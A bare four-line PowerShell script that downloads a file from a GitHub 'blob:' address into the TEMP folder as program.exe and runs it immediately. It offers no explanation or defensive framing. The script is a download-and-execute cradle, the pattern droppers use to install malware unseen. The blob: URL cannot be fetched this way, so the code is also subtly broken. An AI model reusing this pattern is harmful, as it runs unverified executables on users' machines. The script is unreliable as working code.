$url = "blob:https://github.com/818d6568-cc21-4af5-a251-731d6b178162"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
